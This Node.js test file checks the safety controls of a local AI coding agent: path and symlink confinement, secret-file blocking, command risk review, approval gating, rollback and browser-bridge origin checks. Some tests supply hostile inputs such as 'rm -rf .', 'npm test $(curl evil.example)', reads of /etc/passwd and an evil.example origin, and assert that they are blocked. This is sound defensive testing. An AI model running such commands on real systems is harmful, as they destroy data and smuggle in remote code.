import test from 'node:test';
import assert from 'node:assert/strict';
import fs from 'node:fs/promises';
import os from 'node:os';
import path from 'node:path';
import { createWorkspace } from '../src/workspace.js';
import { providerStatus, chat } from '../src/providers.js';
import { reviewCommand, assertCommandAllowed } from '../src/safety.js';
import { validateActions } from '../src/actions.js';
import { applyExactPatch } from '../src/patch.js';
import { createRun, readRun, updateRunStatus, listRuns } from '../src/run-log.js';
import { executeAction } from '../src/action-executor.js';
import { parseAgentResponse } from '../src/response-parser.js';
import { appendMemory, searchMemory } from '../src/memory.js';
import { promoteSkill, listSkills, searchSkills } from '../src/skills.js';
import { searchWorkspace } from '../src/search.js';
import { classifyProviderFailure, ProviderError } from '../src/provider-errors.js';
import { createApprovalProvider } from '../src/approval.js';
import { executePlan, buildRepairContext } from '../src/loop.js';
import { discoverTestCommand, verifyCommandResult } from '../src/verification.js';
import { inspectRepository } from '../src/repository.js';
import { readTransaction, rollbackRun } from '../src/transaction.js';
import { createUnifiedDiff } from '../src/diff.js';
import { normalizeProviderResponse, normalizeUsage } from '../src/provider-response.js';
import { resumePlan } from '../src/resume.js';
import { repairUntilVerified } from '../src/repair.js';
import { verifyWorkspace, verificationToolDefinition } from '../src/verification-tool.js';
import { createBrowserBridge } from '../src/browser-bridge.js';
import { browserCapabilityContext } from '../src/browser-capabilities.js';
import { createBrowserClient } from '../src/browser-client.js';
import { runSetupChecks } from '../src/setup.js';
import { startChat } from '../src/chat.js';
import { firstRunSetup } from '../src/onboarding.js';
import { loadSavedSecrets } from '../src/secrets.js';

test('workspace rejects path traversal', async () => {
  const root = await fs.mkdtemp(path.join(os.tmpdir(), 'kryptic-'));
  const workspace = createWorkspace(root);
  assert.throws(() => workspace.resolveInside('../outside'), /escapes the workspace/);
});

test('workspace rejects symlinks that escape the workspace', async () => {
  const root = await fs.mkdtemp(path.join(os.tmpdir(), 'kryptic-'));
  const outside = await fs.mkdtemp(path.join(os.tmpdir(), 'kryptic-outside-'));
  await fs.writeFile(path.join(outside, 'secret.txt'), 'outside');
  await fs.symlink(outside, path.join(root, 'linked'), 'dir');
  const workspace = createWorkspace(root);
  await assert.rejects(() => workspace.readFile('linked/secret.txt'), /Symlink escapes/);
});

test('workspace blocks secret-looking files', async () => {
  const root = await fs.mkdtemp(path.join(os.tmpdir(), 'kryptic-'));
  const workspace = createWorkspace(root);
  await assert.rejects(() => workspace.writeFile('.env', 'SECRET=bad'), /secret-looking/);
  await assert.rejects(() => workspace.readFile('.env'), /secret-looking/);
});

test('workspace writes and lists files', async () => {
  const root = await fs.mkdtemp(path.join(os.tmpdir(), 'kryptic-'));
  const workspace = createWorkspace(root);
  await workspace.writeFile('src/index.js', 'export const ok = true;');
  assert.deepEqual(await workspace.listFiles('src'), ['src/index.js']);
  assert.equal(await workspace.readFile('src/index.js'), 'export const ok = true;');
});

test('command policy blocks destructive and network commands', () => {
  assert.equal(reviewCommand('npm test').level, 'low');
  assert.equal(reviewCommand('rm -rf .').level, 'high');
  assert.equal(reviewCommand('curl https://example.com').level, 'high');
  assert.equal(reviewCommand('npm test && rm -rf .').level, 'high');
  assert.equal(reviewCommand('npm test $(curl evil.example)').level, 'high');
  assert.equal(reviewCommand('npm test > output.txt').level, 'high');
  assert.equal(reviewCommand('node -e "process.exit(0)"').level, 'low');
  assert.throws(() => assertCommandAllowed('rm -rf .'), /blocked/);
});

test('action validation enforces bounded and reviewable plans', () => {
  assert.deepEqual(validateActions([{ type: 'read_file', path: 'README.md' }]), []);
  assert.match(validateActions([{ type: 'run_command', command: 'rm -rf .' }])[0], /blocked/);
  assert.match(validateActions([{ type: 'write_file', path: 'a.txt', content: 'x' }, { type: 'write_file', path: 'a.txt', content: 'y' }])[0], /same path/);
  assert.match(validateActions([{ type: 'unknown' }])[0], /unknown type/);
});

test('exact-match patching preserves literal replacement metacharacters', async () => {
  const root = await fs.mkdtemp(path.join(os.tmpdir(), 'kryptic-patch-dollar-'));
  const workspace = createWorkspace(root);
  await workspace.writeFile('script.sh', 'echo OLD\\n');
  await applyExactPatch(workspace, { path: 'script.sh', oldText: 'OLD', newText: '$1 $& $` $\' $$' });
  assert.equal(await workspace.readFile('script.sh'), 'echo $1 $& $` $\' $$\\n');
});

test('exact-match patching changes one intended occurrence', async () => {
  const root = await fs.mkdtemp(path.join(os.tmpdir(), 'kryptic-'));
  const workspace = createWorkspace(root);
  await workspace.writeFile('note.txt', 'alpha\\nbeta\\n');
  await applyExactPatch(workspace, { path: 'note.txt', oldText: 'beta', newText: 'gamma' });
  assert.equal(await workspace.readFile('note.txt'), 'alpha\\ngamma\\n');
  await assert.rejects(() => applyExactPatch(workspace, { path: 'note.txt', oldText: 'missing', newText: 'x' }), /not found/);
  await workspace.writeFile('ambiguous.txt', 'x x');
  await assert.rejects(() => applyExactPatch(workspace, { path: 'ambiguous.txt', oldText: 'x', newText: 'y' }), /ambiguous/);
});

test('run records and action execution preserve an audit trail', async () => {
  const root = await fs.mkdtemp(path.join(os.tmpdir(), 'kryptic-'));
  const workspace = createWorkspace(root);
  const run = await createRun(workspace, 'create a note', { provider: 'offline' });
  assert.equal((await readRun(workspace, run.runId)).status, 'created');
  await updateRunStatus(workspace, run.runId, 'executing', { step: 1 });
  await assert.rejects(() => executeAction(workspace, run.runId, { type: 'write_file', path: 'note.txt', content: 'hello' }), /Approval required/);
  await executeAction(workspace, run.runId, { type: 'write_file', path: 'note.txt', content: 'hello' }, { approve: async () => true });
  const saved = JSON.parse(await fs.readFile(path.join(root, '.kryptic', 'runs', `${run.runId}.json`), 'utf8'));
  assert.equal(saved.request, 'create a note');
  assert.ok(saved.events.some((event) => event.kind === 'action_proposed'));
  assert.ok(saved.events.some((event) => event.kind === 'action_completed'));
  assert.equal((await updateRunStatus(workspace, run.runId, 'completed')).status, 'completed');
  assert.equal((await listRuns(workspace)).length, 1);
  await assert.rejects(() => readRun(workspace, '../bad'), /Invalid run ID/);
});

test('agent response parsing is strict and non-executable on invalid output', () => {
  const parsed = parseAgentResponse('```json\n{"plan":"read the README","actions":[{"type":"read_file","path":"README.md"}]}\n```');
  assert.equal(parsed.actions[0].type, 'read_file');
  assert.throws(() => parseAgentResponse('not json'), /not valid JSON/);
  assert.throws(() => parseAgentResponse('{"plan":"bad","actions":[{"type":"run_command","command":"rm -rf ."}]}'), /Invalid agent actions/);
});

test('memory records provenance and supports local search', async () => {
  const root = await fs.mkdtemp(path.join(os.tmpdir(), 'kryptic-'));
  const workspace = createWorkspace(root);
  await appendMemory(workspace, { text: 'The project uses Node.js tests.', origin: 'owner', source: 'user note' });
  await appendMemory(workspace, { text: 'A tool output suggested a dependency.', origin: 'untrusted', source: 'command output' });
  const results = await searchMemory(workspace, 'Node tests');
  assert.equal(results.length, 1);
  assert.match(results[0], /Origin: owner/);
  await assert.rejects(() => appendMemory(workspace, { text: 'bad', origin: 'forged' }), /Invalid memory origin/);
});

test('skills require verified evidence and remain locally searchable', async () => {
  const root = await fs.mkdtemp(path.join(os.tmpdir(), 'kryptic-skills-'));
  const workspace = createWorkspace(root);
  await assert.rejects(() => promoteSkill(workspace, { name: 'unsafe-skill', description: 'bad', instructions: 'bad', evidence: { status: 'failed' } }), /verified evidence/);
  await promoteSkill(workspace, { name: 'test-repair', description: 'Repair tests conservatively.', instructions: 'Run the smallest relevant test command and verify the result before claiming success.', evidence: { status: 'verified' } });
  assert.equal((await listSkills(workspace)).length, 1);
  assert.equal((await searchSkills(workspace, 'relevant test')).length, 1);
});

test('focused search finds bounded matches and excludes secret files', async () => {
  const root = await fs.mkdtemp(path.join(os.tmpdir(), 'kryptic-'));
  const workspace = createWorkspace(root);
  await workspace.writeFile('src/app.js', 'const target = true;\\n');
  await workspace.writeFile('src/other.js', '// target here\\n');
  const result = await searchWorkspace(workspace, 'target');
  assert.equal(result.results.length, 2);
  assert.equal(result.results[0].path, 'src/app.js');
  assert.equal((await searchWorkspace(workspace, 'target', { maxResults: 1 })).truncated, true);
  await assert.rejects(() => workspace.writeFile('.env', 'target=secret'), /secret-looking/);
});

test('provider errors are normalized and retryable only when appropriate', () => {
  const rate = classifyProviderFailure('OpenAI', 429, 'slow down');
  assert.ok(rate instanceof ProviderError);
  assert.equal(rate.kind, 'rate_limit');
  assert.equal(rate.retryable, true);
  const auth = classifyProviderFailure('OpenAI', 401, 'bad key');
  assert.equal(auth.kind, 'authentication');
  assert.equal(auth.retryable, false);
});

test('approval provider denies actions outside an interactive terminal', async () => {
  const approve = createApprovalProvider({ interactive: true, input: { isTTY: false }, output: { isTTY: false } });
  assert.equal(await approve({ type: 'write_file', path: 'x.txt' }), false);
});

test('plan-act-verify loop records completion and failure evidence', async () => {
  const root = await fs.mkdtemp(path.join(os.tmpdir(), 'kryptic-'));
  const workspace = createWorkspace(root);
  await workspace.writeFile('README.md', '# Fixture\\n');
  const run = await createRun(workspace, 'run a safe test', { provider: 'offline' });
  const success = await executePlan(workspace, run.runId, [{ type: 'read_file', path: 'README.md' }], { verify: async () => ({ passed: true, output: 'verified' }) });
  assert.equal(success.status, 'completed');
  const failedRun = await createRun(workspace, 'run a failing test', { provider: 'offline' });
  const failed = await executePlan(workspace, failedRun.runId, [{ type: 'run_command', command: 'node -e "process.exit(2)"' }], { verify: async () => ({ passed: true }) });
  assert.equal(failed.status, 'failed');
  assert.equal(failed.failure.result.exitCode, 2);
  assert.match(buildRepairContext({ type: 'run_command', command: 'npm test' }, { stderr: 'bad test' }).instruction, /smallest repair/);
  const blockedRun = await createRun(workspace, 'write without approval', { provider: 'offline' });
  const blocked = await executePlan(workspace, blockedRun.runId, [{ type: 'write_file', path: 'a.txt', content: 'x' }]);
  assert.equal(blocked.status, 'blocked');
});

test('verification discovers project test commands and never invents one', async () => {
  const root = await fs.mkdtemp(path.join(os.tmpdir(), 'kryptic-'));
  const workspace = createWorkspace(root);
  await workspace.writeFile('package.json', '{"scripts":{"test":"node test.js"}}');
  assert.equal(await discoverTestCommand(workspace), 'npm test');
  assert.deepEqual(await verifyCommandResult({ exitCode: 1, stdout: 'out', stderr: 'err' }), { passed: false, exitCode: 1, stdout: 'out', stderr: 'err' });
  const emptyRoot = await fs.mkdtemp(path.join(os.tmpdir(), 'kryptic-empty-'));
  assert.equal(await discoverTestCommand(createWorkspace(emptyRoot)), null);
});

test('repository inspection summarizes project context without secrets', async () => {
  const root = await fs.mkdtemp(path.join(os.tmpdir(), 'kryptic-repo-'));
  const workspace = createWorkspace(root);
  await workspace.writeFile('README.md', '# Demo\\nTODO: improve this\\n');
  await workspace.writeFile('src/main.js', 'export const main = true;\\n');
  await workspace.writeFile('package.json', '{"scripts":{"test":"node test.js"}}');
  const summary = await inspectRepository(workspace);
  assert.deepEqual(summary.languages, ['JavaScript']);
  assert.equal(summary.testCommand, 'npm test');
  assert.equal(summary.fileCount, 3);
  assert.equal(summary.markers.length, 1);
});

test('failed plans roll back prior edits and preserve transaction evidence', async () => {
  const root = await fs.mkdtemp(path.join(os.tmpdir(), 'kryptic-rollback-'));
  const workspace = createWorkspace(root);
  await workspace.writeFile('existing.txt', 'before');
  const run = await createRun(workspace, 'edit and fail', { provider: 'offline' });
  const result = await executePlan(workspace, run.runId, [
    { type: 'write_file', path: 'existing.txt', content: 'after' },
    { type: 'run_command', command: 'node -e "process.exit(7)"' }
  ], { approve: async () => true });
  assert.equal(result.status, 'failed');
  assert.equal(await workspace.readFile('existing.txt'), 'before');
  assert.deepEqual(result.rollback.restored, ['existing.txt']);
  assert.equal((await readTransaction(workspace, run.runId)).files.length, 1);
  await rollbackRun(workspace, run.runId);
});

test('diff previews show old and new content with bounded output', () => {
  const diff = createUnifiedDiff('demo.txt', 'before\\n', 'after\\n');
  assert.ok(diff.includes('--- a/demo.txt'));
  assert.ok(diff.includes('-before'));
  assert.ok(diff.includes('+after'));
});

test('resume skips completed steps and executes remaining work', async () => {
  const root = await fs.mkdtemp(path.join(os.tmpdir(), 'kryptic-resume-'));
  const workspace = createWorkspace(root);
  await workspace.writeFile('README.md', '# Resume\\n');
  const run = await createRun(workspace, 'resume me', { provider: 'offline' });
  await executePlan(workspace, run.runId, [{ type: 'read_file', path: 'README.md' }], { verify: async () => ({ passed: false, output: 'interrupted after first step' }), rollbackOnFailure: false });
  const resumed = await resumePlan(workspace, run.runId, [
    { type: 'read_file', path: 'README.md' },
    { type: 'read_file', path: 'README.md' }
  ], { verify: async () => ({ passed: true, output: 'verified after resume' }) });
  assert.equal(resumed.status, 'completed');
  assert.equal(resumed.resumed, true);
  assert.equal(resumed.remaining, 1);
});

test('repeated resume preserves original action indexes', async () => {
  const root = await fs.mkdtemp(path.join(os.tmpdir(), 'kryptic-resume-index-'));
  const workspace = createWorkspace(root);
  await workspace.writeFile('README.md', '# Resume indexes\\n');
  const run = await createRun(workspace, 'resume indexes', { provider: 'offline' });
  const actions = [
    { type: 'read_file', path: 'README.md' },
    { type: 'read_file', path: 'README.md' },
    { type: 'read_file', path: 'README.md' }
  ];
  await executePlan(workspace, run.runId, actions.slice(0, 1), { verify: async () => ({ passed: false, output: 'interrupt' }), rollbackOnFailure: false });
  await resumePlan(workspace, run.runId, actions, { verify: async () => ({ passed: false, output: 'interrupt again' }), rollbackOnFailure: false });
  const resumed = await resumePlan(workspace, run.runId, actions, { verify: async () => ({ passed: true, output: 'verified' }), rollbackOnFailure: false });
  assert.equal(resumed.status, 'completed');
  const finalRun = await readRun(workspace, run.runId);
  const indexes = finalRun.events.filter((event) => event.kind === 'step_completed').map((event) => event.index);
  assert.deepEqual(indexes, [0, 1, 2]);
});

test('action validation rejects unsafe paths and oversized payloads', () => {
  assert.ok(validateActions([{ type: 'read_file', path: '/etc/passwd' }]).some((issue) => /unsafe path/.test(issue)));
  assert.ok(validateActions([{ type: 'read_file', path: `safe${String.fromCharCode(0)}escape` }]).some((issue) => /unsafe path/.test(issue)));
  assert.ok(validateActions([{ type: 'run_command', command: 'x'.repeat(2001) }]).some((issue) => /too long/.test(issue)));
  assert.ok(validateActions([{ type: 'write_file', path: 'x.txt', content: 'x'.repeat(1024 * 1024 + 1) }]).some((issue) => /too large/.test(issue)));
});

test('provider response normalization is consistent and rejects empty output', () => {
  assert.equal(normalizeProviderResponse('openai', 'openai', 'test', { choices: [{ message: { content: 'hello' } }], usage: { total_tokens: 2 } }).text, 'hello');
  assert.equal(normalizeProviderResponse('anthropic', 'claude', 'test', { content: [{ type: 'text', text: 'hi' }] }).text, 'hi');
  assert.deepEqual(normalizeProviderResponse('google', 'google', 'test', { candidates: [{ content: { parts: [{ text: 'hey' }] } }], usageMetadata: { totalTokenCount: 3 } }).usage, { inputTokens: 0, outputTokens: 0, totalTokens: 3, provider: 'google' });
  assert.throws(() => normalizeProviderResponse('openai', 'openai', 'test', { choices: [] }), /empty model response/);
});

test('provider chat aborts hung requests and classifies timeout evidence', async () => {
  const previousKey = process.env.OPENAI_API_KEY;
  process.env.OPENAI_API_KEY = 'test-key';
  const previousFetch = globalThis.fetch;
  globalThis.fetch = (_url, options) => new Promise((_resolve, reject) => {
    options.signal.addEventListener('abort', () => { const error = new Error('aborted'); error.name = 'AbortError'; reject(error); });
  });
  await assert.rejects(() => chat({ providerId: 'openai', messages: [{ role: 'user', content: 'ping' }], timeoutMs: 5 }), (error) => error.kind === 'timeout' && error.retryable === true);
  globalThis.fetch = previousFetch;
  if (previousKey === undefined) delete process.env.OPENAI_API_KEY; else process.env.OPENAI_API_KEY = previousKey;
});

test('provider usage normalization is stable across provider formats', () => {
  assert.deepEqual(normalizeUsage('openai', { prompt_tokens: 4, completion_tokens: 6, total_tokens: 10 }), { inputTokens: 4, outputTokens: 6, totalTokens: 10, provider: 'openai' });
  assert.deepEqual(normalizeUsage('anthropic', { input_tokens: 5, output_tokens: 7 }), { inputTokens: 5, outputTokens: 7, totalTokens: 12, provider: 'anthropic' });
  assert.deepEqual(normalizeUsage('google', { promptTokenCount: 3, candidatesTokenCount: 8, totalTokenCount: 11 }), { inputTokens: 3, outputTokens: 8, totalTokens: 11, provider: 'google' });
  assert.equal(normalizeUsage('openai', null), null);
});

test('response parser rejects oversized output and malformed criteria', () => {
  assert.throws(() => parseAgentResponse('x'.repeat(2 * 1024 * 1024 + 1)), /2 MiB/);
  assert.throws(() => parseAgentResponse(JSON.stringify({ plan: 'x', actions: [], acceptanceCriteria: ['x'.repeat(2001)] })), /short strings/);
});

test('repair orchestration retries a bounded failed plan and then verifies', async () => {
  const root = await fs.mkdtemp(path.join(os.tmpdir(), 'kryptic-repair-'));
  const workspace = createWorkspace(root);
  const run = await createRun(workspace, 'repair a task', { provider: 'offline' });
  let proposals = 0;
  const repaired = await repairUntilVerified(workspace, run.runId, [{ type: 'run_command', command: 'node -e "process.exit(3)"' }], {
    proposeRepair: async () => { proposals += 1; return [{ type: 'run_command', command: 'node -e "process.exit(0)"' }]; },
    verify: async (results) => ({ passed: results.every((item) => item.ok) }),
    maxAttempts: 1
  });
  assert.equal(repaired.status, 'completed');
  assert.equal(proposals, 1);
  const invalidRun = await createRun(workspace, 'invalid repair', { provider: 'offline' });
  const invalid = await repairUntilVerified(workspace, invalidRun.runId, [{ type: 'write_file', path: '/tmp/bad', content: 'x' }]);
  assert.equal(invalid.status, 'failed');
  assert.ok(invalid.failure.issues.length > 0);
});

test('verification tool returns structured evidence and classifications', async () => {
  const root = await fs.mkdtemp(path.join(os.tmpdir(), 'kryptic-verify-'));
  const workspace = createWorkspace(root);
  await workspace.writeFile('package.json', JSON.stringify({ scripts: { test: 'node -e "console.log(\\"ok\\")"' } }));
  const passed = await verifyWorkspace(workspace, { timeoutMs: 5000 });
  assert.equal(passed.status, 'verified');
  assert.equal(passed.classification, 'passed');
  assert.equal(passed.command, 'npm test');
  await workspace.writeFile('package.json', JSON.stringify({ scripts: { test: 'node -e "console.error(\\"test failed\\"); process.exit(1)' } }));
  const failed = await verifyWorkspace(workspace, { timeoutMs: 5000 });
  assert.equal(failed.status, 'failed');
  assert.equal(failed.classification, 'test_failure');
  const emptyRoot = await fs.mkdtemp(path.join(os.tmpdir(), 'kryptic-no-test-'));
  const missing = await verifyWorkspace(createWorkspace(emptyRoot));
  assert.equal(missing.status, 'not_configured');
  assert.equal(verificationToolDefinition().name, 'verify_workspace');
});

test('agent action executor can invoke the verification tool', async () => {
  const root = await fs.mkdtemp(path.join(os.tmpdir(), 'kryptic-verify-action-'));
  const workspace = createWorkspace(root);
  await workspace.writeFile('package.json', JSON.stringify({ scripts: { test: 'node -e "process.exit(0)"' } }));
  const run = await createRun(workspace, 'verify project', { provider: 'offline' });
  const result = await executeAction(workspace, run.runId, { type: 'verify_workspace' });
  assert.equal(result.status, 'verified');
  assert.equal(result.classification, 'passed');
});

test('verification failure cannot pass through the agent loop', async () => {
  const root = await fs.mkdtemp(path.join(os.tmpdir(), 'kryptic-verify-fail-'));
  const workspace = createWorkspace(root);
  const run = await createRun(workspace, 'missing verification contract', { provider: 'offline' });
  const result = await executePlan(workspace, run.runId, [{ type: 'verify_workspace' }], { verify: async (results) => ({ passed: results.every((item) => item.ok) }) });
  assert.equal(result.status, 'failed');
  assert.equal(result.results[0].ok, false);
});

test('browser bridge accepts extension events and exposes health', async () => {
  const bridge = createBrowserBridge({ port: 0 });
  const address = await new Promise((resolve) => bridge.server.listen(0, '127.0.0.1', () => resolve(bridge.server.address())));
  const health = await fetch(`http://127.0.0.1:${address.port}/health`).then((response) => response.json());
  assert.equal(health.ok, true);
  const event = await fetch(`http://127.0.0.1:${address.port}/event`, { method: 'POST', headers: { 'content-type': 'application/json' }, body: JSON.stringify({ type: 'takeover_started', tabId: 3 }) }).then((response) => response.json());
  assert.equal(event.ok, true);
  const events = await fetch(`http://127.0.0.1:${address.port}/events`).then((response) => response.json());
  assert.equal(events.events.length, 1);
  await bridge.close();
});

test('browser bridge rejects untrusted origins and enforces configured tokens', async () => {
  const bridge = createBrowserBridge({ port: 0, token: 'bridge-test-token' });
  const address = await new Promise((resolve) => bridge.server.listen(0, '127.0.0.1', () => resolve(bridge.server.address())));
  const base = `http://127.0.0.1:${address.port}`;
  const originBlocked = await fetch(`${base}/command`, { method: 'POST', headers: { origin: 'https://evil.example', 'content-type': 'application/json' }, body: JSON.stringify({ name: 'inspect_page' }) });
  assert.equal(originBlocked.status, 403);
  const missingToken = await fetch(`${base}/command`, { method: 'POST', headers: { origin: 'http://localhost:3000', 'content-type': 'application/json' }, body: JSON.stringify({ name: 'inspect_page' }) });
  assert.equal(missingToken.status, 401);
  const accepted = await fetch(`${base}/command`, { method: 'POST', headers: { origin: 'chrome-extension://test', 'x-kryptic-bridge-token': 'bridge-test-token', 'content-type': 'application/json' }, body: JSON.stringify({ name: 'inspect_page' }) });
  assert.equal(accepted.status, 200);
  await bridge.close();
});

test('browser capabilities are discoverable and commands queue through the bridge', async () => {
  const bridge = createBrowserBridge({ port: 0 });
  const address = await new Promise((resolve) => bridge.server.listen(0, '127.0.0.1', () => resolve(bridge.server.address())));
  const context = browserCapabilityContext({ bridgeAvailable: true, userHasControl: false });
  assert.ok(context.capabilities.some((item) => item.name === 'inspect_page'));
  assert.ok(context.rules.some((rule) => rule.includes('Never silently take control')));
  const client = createBrowserClient({ baseUrl: `http://127.0.0.1:${address.port}`, timeoutMs: 100 });
  const queued = await fetch(`http://127.0.0.1:${address.port}/command`, { method: 'POST', headers: { 'content-type': 'application/json' }, body: JSON.stringify({ name: 'inspect_page' }) }).then((response) => response.json());
  assert.equal(bridge.commands.get(queued.commandId).status, 'queued');
  await bridge.close();
  assert.equal(typeof client.inspectPage, 'function');
});

test('agent can call browser actions through the linked capability client', async () => {
  const root = await fs.mkdtemp(path.join(os.tmpdir(), 'kryptic-browser-action-'));
  const workspace = createWorkspace(root);
  const run = await createRun(workspace, 'inspect browser', { provider: 'offline' });
  const calls = [];
  const browserClient = {
    inspectPage: async () => { calls.push('inspect'); return { page: { title: 'Example' } }; },
    scrollPage: async () => { calls.push('scroll'); return { ok: true }; },
    showWorkingOverlay: async () => { calls.push('overlay'); return { ok: true }; },
    requestTakeover: async () => { calls.push('request_takeover'); return { ok: true, mode: 'takeover_pending' }; },
    handback: async () => { calls.push('handback'); return { ok: true, mode: 'working' }; }
  };
  const result = await executeAction(workspace, run.runId, { type: 'browser_inspect_page' }, { browserClient });
  assert.equal(result.page.title, 'Example');
  assert.deepEqual(calls, ['inspect']);
});

test('browser bridge expires stale commands and bounds event history', async () => {
  const bridge = createBrowserBridge({ port: 0, maxEvents: 1, maxCommands: 1, commandTtlMs: 20 });
  const address = await new Promise((resolve) => bridge.server.listen(0, '127.0.0.1', () => resolve(bridge.server.address())));
  const base = `http://127.0.0.1:${address.port}`;
  const first = await fetch(`${base}/command`, { method: 'POST', headers: { 'content-type': 'application/json' }, body: JSON.stringify({ name: 'inspect_page' }) }).then((response) => response.json());
  await new Promise((resolve) => setTimeout(resolve, 80));
  assert.equal(bridge.commands.get(first.commandId).status, 'failed');
  await fetch(`${base}/event`, { method: 'POST', headers: { 'content-type': 'application/json' }, body: JSON.stringify({ type: 'one' }) });
  await fetch(`${base}/event`, { method: 'POST', headers: { 'content-type': 'application/json' }, body: JSON.stringify({ type: 'two' }) });
  const events = await fetch(`${base}/events`).then((response) => response.json());
  assert.equal(events.events.length, 1);
  await bridge.close();
});

test('browser bridge records completion metadata and rejects duplicate results', async () => {
  const bridge = createBrowserBridge({ port: 0 });
  const address = await new Promise((resolve) => bridge.server.listen(0, '127.0.0.1', () => resolve(bridge.server.address())));
  const base = `http://127.0.0.1:${address.port}`;
  const queued = await fetch(`${base}/command`, { method: 'POST', headers: { 'content-type': 'application/json' }, body: JSON.stringify({ name: 'inspect_page' }) }).then((response) => response.json());
  const first = await fetch(`${base}/command-result`, { method: 'POST', headers: { 'content-type': 'application/json' }, body: JSON.stringify({ commandId: queued.commandId, result: { page: { title: 'First' } } }) });
  assert.equal(first.status, 200);
  assert.ok(bridge.commands.get(queued.commandId).completedAt);
  const duplicate = await fetch(`${base}/command-result`, { method: 'POST', headers: { 'content-type': 'application/json' }, body: JSON.stringify({ commandId: queued.commandId, result: { page: { title: 'Second' } } }) });
  assert.equal(duplicate.status, 409);
  await bridge.close();
});

test('browser client resolves a queued command from extension result', async () => {
  const bridge = createBrowserBridge({ port: 0 });
  const address = await new Promise((resolve) => bridge.server.listen(0, '127.0.0.1', () => resolve(bridge.server.address())));
  const base = `http://127.0.0.1:${address.port}`;
  const client = createBrowserClient({ baseUrl: base, pollMs: 5, timeoutMs: 1000 });
  const pending = client.inspectPage();
  await new Promise((resolve) => setTimeout(resolve, 20));
  const queued = (await fetch(`${base}/commands`).then((response) => response.json())).commands[0];
  assert.equal(queued.name, 'inspect_page');
  await fetch(`${base}/command-result`, { method: 'POST', headers: { 'content-type': 'application/json' }, body: JSON.stringify({ commandId: queued.commandId, result: { page: { title: 'Kryptic test' } } }) });
  const result = await pending;
  assert.equal(result.page.title, 'Kryptic test');
  await bridge.close();
});

test('first-run onboarding stores a provider secret outside the workspace without printing it', async () => {
  const root = await fs.mkdtemp(path.join(os.tmpdir(), 'kryptic-onboard-'));
  const config = await fs.mkdtemp(path.join(os.tmpdir(), 'kryptic-config-'));
  const previousConfig = process.env.KRYPTIC_CONFIG_DIR;
  const previousKey = process.env.OPENAI_API_KEY;
  delete process.env.OPENAI_API_KEY;
  process.env.KRYPTIC_CONFIG_DIR = config;
  const workspace = createWorkspace(root);
  const output = { chunks: [], write(text) { this.chunks.push(text); } };
  const result = await firstRunSetup(workspace, { chooseProvider: async () => 'openai', readKey: async () => 'test-secret-key-123', output });
  assert.equal(result.provider, 'openai');
  assert.ok(result.secretsPath.startsWith(config));
  assert.equal(output.chunks.join('').includes('test-secret-key-123'), false);
  const saved = JSON.parse(await fs.readFile(result.secretsPath, 'utf8'));
  assert.equal(saved.openai, 'test-secret-key-123');
  await fs.access(result.secretsPath);
  if (previousConfig === undefined) delete process.env.KRYPTIC_CONFIG_DIR; else process.env.KRYPTIC_CONFIG_DIR = previousConfig;
  if (previousKey === undefined) delete process.env.OPENAI_API_KEY; else process.env.OPENAI_API_KEY = previousKey;
});

test('setup diagnostics report runtime, providers, tests, and browser state without secrets', async () => {
  const root = await fs.mkdtemp(path.join(os.tmpdir(), 'kryptic-setup-'));
  const workspace = createWorkspace(root);
  await workspace.writeFile('package.json', '{"scripts":{"test":"node --test"}}');
  const result = await runSetupChecks(workspace);
  assert.equal(result.version, '1.0.0');
  assert.ok(result.checks.node.status === 'ready');
  assert.ok(result.checks.providers.available.every((provider) => !('key' in provider)));
  assert.equal(result.checks.tests.command, 'npm test');
  assert.ok(['ready', 'needs_attention'].includes(result.status));
});

test('interactive chat refuses non-TTY input instead of hanging', async () => {
  await assert.rejects(() => startChat({ providerId: 'openai', input: { isTTY: false }, output: { isTTY: false } }), /requires a TTY/);
});

test('provider status is explicit when no key is configured', () => {
  const previous = process.env.GEMINI_API_KEY;
  delete process.env.GEMINI_API_KEY;
  assert.equal(providerStatus('google').configured, false);
  if (previous !== undefined) process.env.GEMINI_API_KEY = previous;
});
